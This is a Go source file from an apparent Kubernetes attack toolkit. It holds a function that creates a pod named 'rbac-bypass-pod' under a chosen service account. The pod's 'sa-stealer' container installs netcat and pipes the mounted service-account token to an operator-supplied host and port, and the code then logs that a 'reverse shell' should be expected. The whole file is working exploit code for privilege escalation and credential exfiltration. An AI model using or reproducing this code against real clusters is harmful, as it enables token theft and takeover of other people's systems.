package attack

import (
	"context"
	"errors"
	"fmt"

	log "github.com/sirupsen/logrus"
	v1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	rest "k8s.io/client-go/rest"
)

func K8sGetSATokenViaCreatePod(token, namespace, serviceAccount, host, port string) {
	var config = new(rest.Config)
	var err = errors.New("")
	switch token {
	case "anonymous":
		config, err = rest.InClusterConfig()
		if err != nil {
			log.Fatal(err)
		}
		config = rest.AnonymousClientConfig(config)
	case "default":
		config, err = rest.InClusterConfig()
		if err != nil {
			log.Fatal(err)
		}
	default:
		config, err = SelfSAConfig(token)
		if err != nil {
			log.Fatal(err)
		}
	}
	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		log.Fatal(err)
	}
	var auto = true
	pod, err := clientset.CoreV1().Pods(namespace).Create(context.TODO(), &v1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name: "rbac-bypass-pod",
		},
		Spec: v1.PodSpec{
			Containers: []v1.Container{
				{
					Name:            "sa-stealer",
					Image:           "ubuntu",
					ImagePullPolicy: v1.PullIfNotPresent,
					Command:         []string{"/bin/sh"},
					Args:            []string{"-c", fmt.Sprintf("apt update && apt install -y netcat; cat /run/secrets/kubernetes.io/serviceaccount/token | nc %s %s", host, port)},
				},
			},
			ServiceAccountName:           serviceAccount,
			AutomountServiceAccountToken: &auto,
		},
	}, metav1.CreateOptions{})
	if err != nil {
		log.Fatal(err)
	}
	log.WithFields(log.Fields{"SUCCESS": true}).Infof("Successfully create Pod %s ! Please prepare to receive the reverse shell at %s:%s.", pod.Name, host, port)
}
